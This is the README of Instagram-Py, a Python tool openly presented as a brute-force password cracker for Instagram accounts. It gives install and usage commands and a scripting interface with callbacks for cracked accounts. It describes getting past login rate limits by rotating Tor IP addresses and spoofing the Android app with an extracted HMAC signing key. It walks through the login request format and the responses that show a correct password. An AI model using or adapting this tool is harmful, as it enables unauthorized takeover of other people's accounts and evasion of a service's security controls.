==============
 Instagram-Py 
==============

    | Instagram-py performs slick brute force attack on Instagram without any type of password limiting
    | and also resumes your attack in ease. 
    
    --DeathSec


.. image:: https://img.shields.io/github/issues/deathsec/instagram-py.svg?style=flat-square   
      :target: https://github.com/deathsec/instagram-py/issues

.. image:: https://img.shields.io/github/forks/deathsec/instagram-py.svg?style=flat-square   
      :target: https://github.com/deathsec/instagram-py/network
      
.. image:: https://img.shields.io/github/stars/deathsec/instagram-py.svg?style=flat-square
      :target: https://github.com/deathsec/instagram-py/stargazers

.. image:: https://img.shields.io/badge/license-MIT-blue.svg?style=flat-square   
      :target: https://raw.githubusercontent.com/deathsec/instagram-py/master/LICENSE

.. image:: https://img.shields.io/pypi/v/instagram-py.svg?style=flat-square
      :target: #



  
.. image:: https://raw.githubusercontent.com/deathsec/instagram-py/v2.x.x/preview.gif

.. image:: http://forthebadge.com/images/badges/built-with-love.svg
      :target: #
.. image:: http://forthebadge.com/images/badges/60-percent-of-the-time-works-every-time.svg
      :target: #
      
.. image:: http://forthebadge.com/images/badges/made-with-python.svg
      :target: #
      

      
-------
 Why?
-------

| **I Actually** started this **project** for **proof of concept** that we can brute force **Instagram** forever.
| When I created the prototype and posted on **Twitter** , I got a **lot of people** who wanted a simple slick tool to execute 
| brute force attack on **Instagram** , So I thought why reinvent the wheel?....
| So I searched **Github** and found nothing worth value , some were fake or poorly engineered!
| And here it is **a Authentic brute force tool for Instagram**


------
 How?
------

| We use , **tor** to change our ip once blocked for many tries and continue attack.
| Since the official api is not a hacker wants, So we use the **InstagramAPK signature** to stay **anonymous!**
| And we also **save** the **progress** so that even in network interruption we can avoid breaking the computer!

 **See the 'Algorimthm' section down below for more hackery!**

-------
 What?
-------

| **Instagram-Py** is a slick python script to perform  **brute force** attack against **Instagram** ,   
| this script can **bypass** login limiting on wrong passwords ,  so basically it can test **infinite number of passwords**.
| Instagram-Py is **proved** and can test **over 6M** passwords on a single instagram account with **less resource** as possible
| This script mimics the activities of the official **instagram android app** and sends request over **tor** so you are secure ,
| but if your **tor** installation is **misconfigured** then the blame is on you.


------------
 Features
------------

* Instagram-Py Scripting

  Craft your own python script which will embed into Instagram-Py for Maximum Customization of your
  brute force attack , example: What if you want a message sent to your phone when an account is hacked?

* Resumes Attacks when the same wordlist is used on the same Username
* Dumps successfully cracked accounts in the dump
* Maximum Customization! ( This includes multiple attack vectors! )
* Fast and Clean Code , no ugly selenum drivers! ( Pure Requests )
* Elegant Tor Identity Change with Stem ( Tor's Official Library for Python )


**Depends on**: python3 , tor ,  requests , requests[socks] , stem

==============
 Installation
==============
---------------------------------
 Upgrading Instagram-Py with pip
---------------------------------

::

 $ sudo pip3 install instagram-py --upgrade


-------------------------------
 using pip to get Instagram-py
-------------------------------

**Make sure you have got the latest version of pip(>= 9.0 and python(>= 3.6)**

::

 $ sudo easy_install3 -U pip # you have to install python3-setuptools , update pip
 $ sudo pip3 install requests --upgrade
 $ sudo pip3 install requests[socks]
 $ sudo pip3 install stem
 $ sudo pip3 install instagram-py
 $ instagram-py # installed successfully
 $ # Configuration is Super Important so Lets Create One
 $ instagram-py --create-configuration # follow the steps... 

--------------------------------
    Configuring Instagram-Py
--------------------------------

**As of v2.0.0 Configuration is Simply done by Passing an Argument to Instagram-Py**

::

 $ instagram-py --create-configuration
 $      # OR
 $ instagram-py -cc



**Or if you just want the default settings without the annoying questions then**

::

 $ instagram-py --create-configuration --default-configuration
 $      # OR
 $ instagram-py -cc -dc



--------------------------------------------------
    Configuring Tor server to open control port
--------------------------------------------------

open your **tor configuration** file usually located at **/etc/tor/torrc**


::
 
 $ sudo vim /etc/tor/torrc # open it with your text editor
 

**search** for the file for this **specific section**

::

 ## The port on which Tor will listen for local connections from Tor
 ## controller applications, as documented in control-spec.txt.
 #ControlPort 9051
 
**uncomment** 'ControlPort' by deleting the **#** before 'ControlPort' , **now save the file and restart your tor server**

**now you are ready to crack any instagram account , make sure your tor configuration matched ~/instapy-config.json** 

=============
    Usage
=============

**Finally** , now you can use instagram-py!

**Instagram-Py Scripting lets you run Custom Python Scripts Inside Instagram-Py!**

**Never Run Instagram-Py with Multiple Instance! , Use Instagram-Py Scripting Instead!**


::

 $ instagram-py -u your_account_username -pl path_to_password_list


**Note**: Without the **-c** optional argument , instagram-py **will not continue the attack**

::

 usage: instagram-py [-h] [--username USERNAME] [--password-list PASSWORD_LIST]
                     [--script SCRIPT] [--inspect-username INSPECT_USERNAME]
                     [--create-configuration] [--default-configuration]
                     [--countinue] [--verbose]
 
 optional arguments:
   -h, --help            show this help message and exit
   --username USERNAME, -u USERNAME
                         username for Instagram account
   --password-list PASSWORD_LIST, -pl PASSWORD_LIST
                         password list file to try with the given username.
   --script SCRIPT, -s SCRIPT
                         Instagram-Py Attack Script.
   --inspect-username INSPECT_USERNAME, -i INSPECT_USERNAME
                         Username to inspect in the instagram-py dump.
   --create-configuration, -cc
                         Create a Configuration file for Instagram-Py with
                         ease.
   --default-configuration, -dc
                         noconfirm for Instagram-Py Configuration Creator!
   --countinue, -c       Countinue the previous attack if found.
   --verbose, -v         Activate Verbose mode. ( Verbose level )

 example: instagram-py -c -vvv -u instatestgod__ -pl rockyou.txt

 Report bug, suggestions and new features at https://github.com/deathsec/instagram-py



========================
 Instagram-Py Scripting
========================

::

 $ # To Run Instagram-Py Script
 $ instagram-py -s [Script Location]
 $      # OR
 $ chmod +x attack_script.py
 $ ./attack_script.py
 $ # Please Make sure that attack_script.py has the shebang!
 $ # Example: #!/usr/bin/instagram-py -s


Instagram-Py now lets you run your custom scripts inside of it for maximum customization of your attacks.
This Scripts are simple Python Scripts ( You Can just do anything that is possible with python )

Refer the Wiki to get full information about Instagram-Py Scripting , https://github.com/deathsec/instagram-py/wiki
Also look into the **examples** tree present in this repo , it contains simple example scripts.

--------------------
 Reserved Variables
--------------------

**Please do not use these without the given syntax**

**global_password_list:**

Declare this if you want to use this password list as the default fallback password list!

::

 #!/usr/bin/instagram-py -s 
 # Do not forget the shebangs! from above , if you want to run it like a script
 # Some Python Script Header Section
 
 ....
 # This is not mandatory if local password lists are declared which you will see later.
 global_password_list = "{}/facebook.lst".format(os.path.expanduser('~'))


**global_callback:**

Declare this if you want this function callback to be called when any account is successfully cracked!

::

 #!/usr/bin/instagram-py -s
 
 ....
 # This is Optional
 # Callback function syntax , do not change this!
 # you can change the name...
 def message_me_when_hacked(username , password):
        # Use Twilio Free API to Send Messages to Your Phone
        print("Hacked @" + username + " with Password " + password)
 
 ....

 global_callback = message_me_when_hacked

 ....




**usernames:**

**This is the most important variable** , its of type dict and contains all information for the attack

::

 #!/usr/bin/instagram-py -s

 ....

 def very_important_ac_hacked(username , pass):
        # Do Something Evil!

 ....

 # Do Whatever with python here

 # This is Mandatory!

 usernames = [ # do not use '{' , it will not work!
                  {
                        "id" : "Target Username" , # account username
                        # Optional if global_password_list is declared!
                        "password_list" : "Full Path to Wordlist" , # ~ does not work here!
                        # use os.path.expanduser('~') for ~ ( Home Path Resolution! )
                        "callback" : very_important_ac_hacked, # Optional
                        "continue" : True, # Optional
                        "verbose"  : 3, # Optional
                  },
                  { 
                        # More Targets with the same syntax 
                  }

 ]




**You Can Always View the Cracked Passwords Using this command!**

::

 $ instagram-py -i instatestgod__
 $ # Displays record if it is cracked in the past!



**Note**: Without the **-c** optional argument , instagram-py **will not continue the attack**

::

 usage: instagram-py [-h] [--countinue] [--verbose]
                    USERNAME [USERNAME ...] PASSWORD_LIST [PASSWORD_LIST ...]

 positional arguments:
   USERNAME         username for Instagram account
   PASSWORD_LIST    password list file to try with the given username.

 optional arguments:
   -h, --help       show this help message and exit
   --countinue, -c  Countinue the previous attack if found.
   --verbose, -v    Activate Verbose mode. ( Verbose level )

 example: instagram-py -v instatestgod__ rockyou.txt


===========
 Algorithm
===========

**Instagram-Py** uses a very simple algorithm for checking passwords efficiently , this section is dedicated for those who
wish to recreate this program in any other language.


**You can see this live when you run the tool in max verbosity**

::

 $ instagram-py -vvv -u instatestgod__ -pl password_list.lst

**You can also use Instagram-Py as a module , so that you can also use it in your script**

-------------
 What we do
-------------

**Step 1:** Get the magic cookie , which is used to verify device integrity!

Getting the magic cookie is the simplest job , all we need to do is send a get request to **https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=** , where the **guid** get parameter is a random 32 character string.
The random 32 character string can be generator using python's simple **uuid library** , to be specific **v4** of **UUID**.
So finally we just have to request the url **https://i.instagram.com/api/v1/si/fetch_headers/?challenge_type=signup&guid=800e88b931bf491fa3b4a7afa4e679eb** and get the cookie named **csrftoken** , if we observe the **response header** we
could see that our cookie only **expires** next **year** the same day. So by this we only have to make this request once
and can use it for a year! How vulnerable is that?... 

.. image:: https://raw.githubusercontent.com/deathsec/instagram-py/master/observations/cookies.png 
      :target: #


**Step 2:** Build a post request with Instagram's signature.

This part is **simple** but may be difficult to setup , first i need to get instagram's signature
which is only present in their free apk from google play , Remember our **Strength can be our Weakness**
, All i have to do reverse engineer the apk and find the signature, lets call it **ig_sig**.

::
 
 ig_sig = 4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178
 ig_version = 4

**Instagram** uses **HMAC Authentication** for login stuff, so lets use python's **hmac library**.
But first we have to build our body which will be encoded in json for it to actually sign with 
**ig_sig** , So the post **body** looks likes this...


::
 
 phone_id   = <RANDOM 32 CHARACTER STRING SEPERATED WITH - on EQUAL INTERVALS>
 _csrftoken = <THE MAGIC COOKIE THAT WE GOT!>
 username   = <TARGET ACCOUNT>
 guid       = <RANDOM 32 CHARACTER STRING SEPERATED WITH - on EQUAL INTERVALS>
 device_id  = android-<RANDOM 16 CHARACTER STRING>
 password   = <PASSWORD TO TRY>
 login_attempt_count = 0


The above will be encoded to **JSON** , So to test the password we have to post the data to this url
**https://i.instagram.com/api/v1/accounts/login/ig_sig_key_version=4&signed_body=<SIGNED BODY>.<URL ENCODED JSON DATA>** .

**<SIGNED BODY>:** using **HMAC** , sign our json encoded data with **ig_sig** and return a hexa value.

**<URL ENCODED JSON DATA>:** the same data in json but we url encode so that it goes properly to insta!

So to test a account with username as **USERNAME** and password with **PASSWORD** we simply request this
url **https://i.instagram.com/api/v1/accounts/login/ig_sig_key_version=4&signed_body=bc90e1b7d430f39152e92b4e7d517bfb231dbe0515ed2071dc784cf876e301c3.%7B%22phone_id%22%3A%20%2232abb45c-f605-4fd7-9b5e-674115516b90%22%2C%20%22_csrftoken%22%3A%20%22PyMH2niVQrk41UIBW0lKilleG7GylluQ%22%2C%20%22username%22%3A%20%22USERNAME%22%2C%20%22guid%22%3A%20%2267ca220c-a9eb-4240-b173-2d253808904d%22%2C%20%22device_id%22%3A%20%22android-283abce46cb0a0bcef4%22%2C%20%22password%22%3A%20%22PASSWORD%22%2C%20%22login_attempt_count%22%3A%20%220%22%7D** 

**Take a look** how I did it... 

.. image:: https://raw.githubusercontent.com/deathsec/instagram-py/master/observations/login_create.png


**Step 3:** With the json response and response code , we determine the password is correct or wrong.

if **We get response 200** then the login is success but if we get **response 400** , We inspect the
**json data** for clues if it is the **correct password or invalid request or too many tries**.
So we inspect the **message** from instagram json response!

**Message = Challenge Required** , then the password is correct but instagram got some questions so
we must wait until the user logs in and answer the question and if we are lucky they will not change
the password and we could login in later(**Most of the time people won't change the password!**)

**Message = The password you entered is incorrect.** , then the password is incorrect for sure , try
another.

**Message as something like word invalid in it then** , some other error so just try again, can happen
because of wordlist encoding error which i ignored because all the worldlist have encoding error!

**Message = Too many tries** , Time to change our ip and loop but we don't want to change our magic cookie

**Thats it you just hacked instagram with a very simple algorithm!**

==============
 Contribution
==============

.. image:: https://img.shields.io/github/contributors/deathsec/instagram-py.svg?style=flat-square


Contribute anything you can to this repo **(Issues | Pull request)** , help is much **appreciated**.

**Please Refer CONTRIBUTING.rst for more information on contributing code!**


===========================
 Using Instagram-Py as API
===========================

**Instagram-Py supports to be used as a module as of v1.3.2 , so you don't want to reproduce my code. Just use it!**

For some reason you wish not to use my software then you can use my software as a module and embed into your own
software , anyway its native so its just gonna run the same as the official command-line tool unless you do something crazy.

**Follow the same installation method mentioned above to install Instagram-Py API.**

This is a simple script to conduct a bructe force attack using instagram-py as a API.

::

 #!/usr/bin/env python3
 '''
   This is the same thing that is in the __init__ file of the command-line
   tool.
 '''
 from InstagramPy.InstagramPyCLI import InstagramPyCLI
 from InstagramPy.InstagramPySession import InstagramPySession , DEFAULT_PATH
 from InstagramPy.InstagramPyInstance import InstagramPyInstance
 from datetime import datetime
 
 username = "TARGET ACCOUNT USERNAME"
 password = "PASSWORD LIST PATH"

 appInfo = {
    "version"     : "0.0.1",
    "name"        : "Instagram-Py Clone",
    "description" : "Some Module to crack instagram!",
    "author"      : "YourName",
    "company"     : "YourCompany",
    "year"        : "2017",
    "example"     : ""
 }

 cli = InstagramPyCLI(appinfo = appInfo , started = datetime.now() , verbose_level = 3)
 
 '''
 # USE THIS IF YOU WANT
 cli.PrintHeader()
 cli.PrintDatetime()
 '''
 session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)
 session.ReadSaveFile(True) # True to countinue attack if found save file.
 '''
 # USE THIS IF YOU WANT
 cli.PrintMagicCookie(session.magic_cookie)
 '''

 '''
  Defining @param cli = None will make Instagram-Py run silently so you
  can you use your own interface if you like.
  or if you want to use the official interface then declare like this

  instagrampy = InstagramPyInstance(cli = cli , session = session)

 '''

 instagrampy = InstagramPyInstance(cli = None ,session = session)
 while not instagrampy.PasswordFound():
        print('Trying... '+session.CurrentPassword())
        instagrampy.TryPassword()

 if instagrampy.PasswordFound():
        print('Password Found: '+session.CurrentPassword())

 exit(0) 



**Refer the Wiki to get full information about the api , https://github.com/deathsec/instagram-py/wiki**




=============
   License
=============

The MIT License,

Copyright (C) 2017 The Future Shell , DeathSec
